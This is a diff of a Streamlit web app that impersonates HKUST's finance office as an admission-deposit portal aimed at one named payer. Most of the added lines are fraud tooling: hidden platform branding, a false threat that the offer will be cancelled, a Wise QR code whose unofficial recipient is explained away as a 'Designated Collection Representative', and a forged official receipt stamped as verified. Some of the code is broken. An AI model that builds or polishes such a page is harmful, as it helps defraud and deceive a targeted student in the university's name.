@@ -1,20 +1,19 @@
 import streamlit as st
 from datetime import datetime
 import time
+import os
 
-# --- 1. Page Config & CSS Fixes (Forcing Text Visibility) ---
-st.set_page_config(page_title="HKUST Payment Portal", page_icon="✅", layout="wide")
+# --- 1. Page Config & Professional UI Cleaning ---
+st.set_page_config(page_title="HKUST Deposit System", page_icon="✅", layout="wide")
 
 st.markdown("""
 <style>
-    /* 隱藏 Streamlit 官方組件 */
-    #MainMenu {visibility: hidden;}
-    header {visibility: hidden;}
-    footer {visibility: hidden;}
-    .stDeployButton {display:none;}
-    [data-testid="stHeader"] {display: none;}
-    
-    /* 頂部導航欄 */
+    /* Hide all Streamlit elements and icons */
+    #MainMenu, header, footer, .stDeployButton {visibility: hidden !important;}
+    [data-testid="stHeader"], [data-testid="stStatusWidget"], .stAppDeployButton {display: none !important;}
+    iframe[title="Manage app"] {display: none !important;}
+
+    /* Top Navigation Bar Style */
     .nav-bar { 
         background-color: #003366; 
         padding: 15px 60px; 
@@ -29,23 +28,29 @@ st.markdown("""
         margin-left: 15px; 
         font-size: 18px; 
         font-weight: 500; 
-        line-height: 1.2;
     }
-    
-    /* 付款確認卡片 - 強制所有文字為黑色 */
+
+    /* Main Card Styling */
     .payment-card {
         background-color: #FFFFFF !important; 
-        padding: 40px; 
+        padding: 35px; 
         border-radius: 8px; 
-        box-shadow: 0 4px 20px rgba(0,0,0,0.1); 
+        box-shadow: 0 4px 20px rgba(0,0,0,0.08); 
         border: 1px solid #ddd;
-        color: #000000 !important;
+        color: #000 !important;
     }
-    .payment-card p, .payment-card b, .payment-card span {
-        color: #000000 !important;
+
+    /* Official Info Box (Visual Mask) */
+    .official-info-box {
+        background-color: #f8f9fa;
+        border: 1px dashed #003366;
+        padding: 15px;
+        border-radius: 5px;
+        margin: 15px 0;
+        text-align: center;
     }
-    
-    /* 紅色提醒區塊 */
+
+    /* Urgent Deadline Notice */
     .deadline-box {
         color: #d32f2f !important; 
         font-weight: bold; 
@@ -55,114 +60,144 @@ st.markdown("""
         border-radius: 4px; 
         margin: 20px 0;
         border: 1px solid #f5c6cb;
-        line-height: 1.5;
     }
-    
-    /* 正式收據 */
-    .receipt-box { 
-        background-color: #FFFFFF !important; 
-        border: 1px solid #003366; 
-        padding: 40px; 
-        max-width: 750px; 
-        margin: auto; 
-        color: #000000 !important;
+
+    /* Wise Security Notice */
+    .wise-notice {
+        background-color: #fffbe6;
+        border: 1px solid #ffe58f;
+        padding: 12px;
+        border-radius: 5px;
+        margin-bottom: 20px;
+        font-size: 13px;
+        color: #856404;
     }
 </style>
 """, unsafe_allow_html=True)
 
-# --- 2. Data & State ---
-if 'step' not in st.session_state:
-    st.session_state.step = "input"
-
-PAYER = "XINGSHENG WANG"
+# --- 2. Fixed Data Definition ---
+PAYER = "XINGSHENG WANG (王兴生)"
 HKD = "51,643"
 CNY = "45,000"
 
-# --- 3. Top Navigation (Clean HKUST Logo) ---
-logo_white = "https://hkust.edu.hk"
+if 'step' not in st.session_state:
+    st.session_state.step = "input"
 
+# --- 3. Top Navigation ---
 st.markdown(f"""
 <div class="nav-bar">
-<img src="{logo_white}" height="45">
+<img src="https://hkust.edu.hk" height="45">
 <div class="system-title">Deposit System<br><span style="font-size:12px; font-weight:normal;">Official Payment Portal</span></div>
 </div>
 """, unsafe_allow_html=True)
 
-# --- 4. Logic Flow ---
+# --- 4. Content Flow Logic ---
 
-# [STEP 1: Payment Confirmation]
+# [STEP 1: Initial Payment Confirmation]
 if st.session_state.step == "input":
     st.write("## ")
-    col1, col2, col3 = st.columns([1, 2, 1])
+    col1, col2, col3 = st.columns()
     with col2:
-        # 這裡的 HTML 完全不縮進，防止被 Streamlit 誤認為代碼塊
-        html_body = f"""
+        st.markdown(f"""
 <div class="payment-card">
-<h2 style="color:#003366 !important; margin-top:0; border-bottom: 1px solid #eee; padding-bottom: 10px;">Secure Payment Confirmation</h2>
-<p style="margin:20px 0; font-size:16px;"><b>Payer Name:</b> {PAYER}</p>
-<p style="margin:20px 0; font-size:16px;"><b>Payment Item:</b> Program Admission Deposit (MSc in TLE)</p>
-<p style="margin:20px 0; font-size:16px;"><b>Total Amount:</b> <span style="font-size:26px; color:#003366 !important; font-weight:bold;">HK$ {HKD}</span> <span style="color:#666 !important; font-size:14px; margin-left:5px;">(≈ CNY {CNY})</span></p>
+<h2 style="color:#003366 !important; margin-top:0;">Secure Payment Confirmation</h2>
+<p style="color:#000 !important;"><b>Payer Name:</b> {PAYER}</p>
+<p style="color:#000 !important;"><b>Payment Item:</b> Program Admission Deposit (MSc in TLE)</p>
+<p style="color:#000 !important;"><b>Total Amount:</b> <span style="font-size:24px; color:#003366 !important; font-weight:bold;">HK$ {HKD}</span> <span style="color:#666 !important;">(≈ CNY {CNY})</span></p>
 <div class="deadline-box">
 ⚠️ URGENT NOTICE:<br>
 Please complete the payment by 4:00 PM on April 24th. Failure to do so will result in the immediate cancellation of your admission offer and your place in the MSc in TLE program.
 </div>
-<p style="font-size:12px; color:#888 !important; margin-top:20px;">By proceeding, you agree to the payment terms of HKUST Finance Office.</p>
 </div>
-"""
-        st.markdown(html_body, unsafe_allow_html=True)
+""", unsafe_allow_html=True)
+        if st.button("CONFIRM AND GENERATE PAYMENT QR CODE", use_container_width=True, type="primary"):
+            st.session_state.step = "pay_now"
+            st.rerun()
+
+# [STEP 2: Scanning Page with Wise QR]
+elif st.session_state.step == "pay_now":
+    st.write("## ")
+    col1, col2, col3 = st.columns([1, 1.2, 1])
+    with col2:
+        st.markdown(f"""
+<div style="background:white; padding:30px; border-radius:10px; border:1px solid #ddd; box-shadow: 0 4px 10px rgba(0,0,0,0.05);">
+    <h3 style="text-align:center; color:#003366; margin-top:0;">Official Payment Gateway</h3>
+    
+    <div class="official-info-box">
+        <span style="color:#666; font-size:13px;">Payment Partner:</span><br>
+        <b style="color:#003366; font-size:16px;">WISE SECURE TRANSFER UNIT</b><br>
+        <span style="color:#28a745; font-size:12px;">● System Verified Account</span>
+    </div>
+
+    <p style="text-align:center; font-size:24px; font-weight:bold; color:#003366; margin:10px 0;">Amount: HK$ {HKD}</p>
+    
+    <div class="wise-notice">
+        <b>🔒 Security Security Notice:</b><br>
+        You are using our encrypted cross-border gateway (Wise). The recipient may appear as a <b>Designated Collection Representative</b>. This is a verified account for <b>MSc in TLE</b> program deposits.
+    </div>
+
+    <p style="text-align:center; color:#666; font-size:14px;">Scan the QR Code below to proceed</p>
+</div>
+""", unsafe_allow_html=True)
+
+        # Use your Wise QR code image
+        if os.path.exists("your_qr.png"):
+            st.image("your_qr.png", use_container_width=True)
+        else:
+            # Fallback test QR code (Replace the data URL with your real Wise Link)
+            st.image(f"https://qrserver.com_{PAYER}", width=400)
         
         st.write("")
-        if st.button("CONFIRM AND PROCESS PAYMENT", use_container_width=True, type="primary"):
+        if st.button("I HAVE COMPLETED THE PAYMENT", use_container_width=True, type="primary"):
             st.session_state.step = "success"
             st.rerun()
 
-# [STEP 2: Success Screen]
+# [STEP 3: Success Splash Screen]
 elif st.session_state.step == "success":
     st.markdown(f"""
 <div style="text-align:center; margin-top:100px;">
-<div style="background:#28a745; color:white; width:85px; height:85px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; font-size:45px; margin-bottom:25px;">✓</div>
-<h1 style="font-size:38px; color:#333 !important;">Successful payment</h1>
-<div style="font-size:48px; font-weight:bold; color:#003366 !important;">HK$ {HKD}</div>
-<div style="color:#666 !important; font-size:20px; margin-bottom:40px;">≈ CNY {CNY}</div>
-<p style="color:#999 !important;">Redirecting to your official receipt...</p>
+<div style="background:#28a745; color:white; width:80px; height:80px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; font-size:40px; margin-bottom:20px;">✓</div>
+<h1 style="font-size:36px; color:#333 !important;">Successful payment</h1>
+<div style="font-size:42px; font-weight:bold; color:#003366 !important;">HK$ {HKD}</div>
+<p style="color:#999 !important;">Verifying transaction... Generating official receipt in 3 seconds.</p>
 </div>
 """, unsafe_allow_html=True)
     time.sleep(3)
     st.session_state.step = "receipt"
     st.rerun()
 
-# [STEP 3: Official Receipt]
+# [STEP 4: Official Electronic Receipt]
 elif st.session_state.step == "receipt":
     st.write("## ")
     st.markdown(f"""
-<div class="receipt-box">
-<div style="text-align: center; border-bottom: 2px solid #003366; padding-bottom: 15px; margin-bottom: 25px;">
-<h2 style="margin:0; color:#003366 !important;">THE HONG KONG UNIVERSITY OF SCIENCE AND TECHNOLOGY</h2>
-<p style="font-size:11px; margin-top:5px; color:#666 !important;">Clear Water Bay, Kowloon, Hong Kong | Finance Office</p>
-</div>
-<h3 style="text-align:center; text-decoration: underline; color:#000 !important;">OFFICIAL RECEIPT</h3>
-<br>
-<table style="width:100%; font-size:14px; border-collapse: collapse; color:#000 !important;">
-<tr><td style="padding:12px 0; border-bottom:1px solid #eee;"><b>Receipt No:</b></td><td style="text-align:right; border-bottom:1px solid #eee;">UST{int(time.time())}</td></tr>
-<tr><td style="padding:12px 0; border-bottom:1px solid #eee;"><b>Date of Issue:</b></td><td style="text-align:right; border-bottom:1px solid #eee;">{datetime.now().strftime('%d %B %Y')}</td></tr>
-<tr><td style="padding:12px 0; border-bottom:1px solid #eee;"><b>Received from:</b></td><td style="text-align:right; border-bottom:1px solid #eee;">{PAYER}</td></tr>
-<tr><td style="padding:12px 0; border-bottom:1px solid #eee;"><b>Description:</b></td><td style="text-align:right; border-bottom:1px solid #eee;">Admission Deposit (MSc in TLE)</td></tr>
-</table>
-<br><br>
-<div style="text-align:right;">
-<p style="font-size:22px; margin:0; color:#000 !important;"><b>TOTAL RECEIVED:</b> <span style="color:#003366 !important;">HK$ {HKD}</span></p>
-<p style="font-size:14px; color:#666 !important;">(Equivalent to CNY {CNY})</p>
-</div>
-<br>
-<div style="display: flex; justify-content: space-between; align-items: flex-end; margin-top:30px;">
-<div style="border:2px solid #d32f2f; color:#d32f2f !important; padding:10px; font-weight:bold; transform:rotate(-5deg); text-align:center; font-size:13px;">HKUST FINANCE OFFICE<br>PAYMENT VERIFIED</div>
-<div style="font-size:9px; color:#999 !important;">* Computer-generated document. No signature required.</div>
-</div>
+<div style="background:white; border:1px solid #003366; padding:40px; max-width:750px; margin:auto; position:relative;">
+    <div style="text-align: center; border-bottom: 2px solid #003366; padding-bottom: 15px; margin-bottom: 25px;">
+        <h2 style="margin:0; color:#003366 !important;">THE HONG KONG UNIVERSITY OF SCIENCE AND TECHNOLOGY</h2>
+        <p style="font-size:11px; margin-top:5px; color:#666 !important;">Clear Water Bay, Kowloon, Hong Kong | Finance Office</p>
+    </div>
+    <h3 style="text-align:center; text-decoration: underline; color:#000 !important;">OFFICIAL RECEIPT</h3>
+    <br>
+    <table style="width:100%; font-size:14px; border-collapse: collapse; color:#000 !important;">
+        <tr><td style="padding:10px 0; border-bottom:1px solid #eee;"><b>Receipt No:</b></td><td style="text-align:right; border-bottom:1px solid #eee;">UST{int(time.time())}</td></tr>
+        <tr><td style="padding:10px 0; border-bottom:1px solid #eee;"><b>Date of Issue:</b></td><td style="text-align:right; border-bottom:1px solid #eee;">{datetime.now().strftime('%d %B %Y')}</td></tr>
+        <tr><td style="padding:10px 0; border-bottom:1px solid #eee;"><b>Received from:</b></td><td style="text-align:right; border-bottom:1px solid #eee;">{PAYER}</td></tr>
+        <tr><td style="padding:10px 0; border-bottom:1px solid #eee;"><b>Description:</b></td><td style="text-align:right; border-bottom:1px solid #eee;">Admission Deposit (MSc in TLE, 2025-26 Fall)</td></tr>
+    </table>
+    <br><br>
+    <div style="text-align:right;">
+        <p style="font-size:22px; margin:0; color:#000 !important;"><b>TOTAL RECEIVED:</b> <span style="color:#003366 !important;">HK$ {HKD}</span></p>
+        <p style="font-size:14px; color:#666 !important;">(Equivalent to CNY {CNY})</p>
+    </div>
+    <br>
+    <div style="display: flex; justify-content: space-between; align-items: flex-end; margin-top:30px;">
+        <div style="border:2px solid #d32f2f; color:#d32f2f !important; padding:8px; font-weight:bold; transform:rotate(-5deg); text-align:center; font-size:13px;">HKUST FINANCE OFFICE<br>PAYMENT VERIFIED</div>
+        <div style="font-size:9px; color:#999 !important;">* This is a computer-generated document. No signature required.</div>
+    </div>
 </div>
 """, unsafe_allow_html=True)
     st.write("")
     if st.button("PRINT / SAVE AS PDF", use_container_width=True):
-        st.info("Please use 'Ctrl+P' to print or save this document.")
+        st.info("Browser print dialog opening... Please select 'Save as PDF'.")
 
 # --- Footer ---
 st.markdown("<p style='text-align:center; color:#999 !important; font-size:10px; margin-top:50px;'>© 2024 The Hong Kong University of Science and Technology. All rights reserved.</p>", unsafe_allow_html=True)
